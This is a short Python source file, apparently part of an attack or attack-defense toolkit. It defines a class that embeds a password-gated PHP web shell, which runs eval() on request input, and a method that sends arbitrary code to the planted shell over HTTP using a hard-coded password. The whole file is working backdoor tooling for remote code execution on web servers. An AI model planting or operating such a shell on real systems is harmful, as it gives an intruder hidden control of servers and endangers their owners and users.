from .shellbase import EvalShellBase, ShellBase


class Shell2(EvalShellBase):
    CONTENT = '''
<?php
if(md5($_GET['pops'])==='b2833bce5a12bec044ba5f403f86bfc9'){
    eval($_REQUEST[0]);
}?>
'''
    def __init__(self,url):
        self.url = url
    def run(self,code):
        return request.post(url=self.url+'?pops=www.nwpu.edu.cn',data={"0":code}).text
        
